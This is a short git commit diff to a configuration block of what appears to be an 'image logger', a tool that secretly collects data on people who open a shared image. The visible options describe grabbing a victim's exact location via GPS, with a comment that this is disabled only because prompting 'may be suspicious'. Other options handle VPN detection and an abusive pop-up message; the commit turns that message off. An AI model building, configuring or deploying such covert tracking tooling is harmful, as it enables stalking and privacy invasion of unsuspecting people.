b9e37f2375e8c057eba0e3b6fe8c1e4f8584af4d
zodiak <154312939+momodz092010@users.noreply.github.com>
2025-01-31 11:20:57 +0100

    Update imaged.py

--- api/imaged.py
+++ api/imaged.py
@@ -25,9 +25,9 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True , # Enable the custom message?
+        "doMessage": False , # Enable the custom message?
         "message": "we fucked u ass hole ( m ) ( o ) sended that  ", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": False , # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
